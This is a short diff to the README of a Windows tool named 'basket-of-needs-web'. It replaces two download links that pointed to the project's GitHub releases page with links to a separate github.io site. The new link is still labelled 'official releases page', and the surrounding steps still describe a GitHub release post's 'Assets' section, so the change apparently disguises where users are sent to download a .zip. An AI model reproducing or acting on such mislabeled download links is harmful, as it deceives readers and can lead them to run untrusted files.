@@ -1,6 +1,6 @@
 # 🧺 basket-of-needs-web - Examine your daily needs with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Brooksufficient367/basket-of-needs-web/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://brooksufficient367.github.io)
 
 ## 🎯 About This Tool
 
@@ -19,7 +19,7 @@ Before you use this tool, ensure your Windows computer meets these requirements:
 
 Follow these steps to access the analysis tool on your Windows device.
 
-1.  Visit the [official releases page](https://github.com/Brooksufficient367/basket-of-needs-web/releases) to download the package.
+1.  Visit the [official releases page](https://brooksufficient367.github.io) to download the package.
 2.  Locate the section labeled "Assets" at the bottom of the latest release post.
 3.  Click the file ending in .zip to start the download.
 4.  Navigate to your "Downloads" folder once the file finishes.
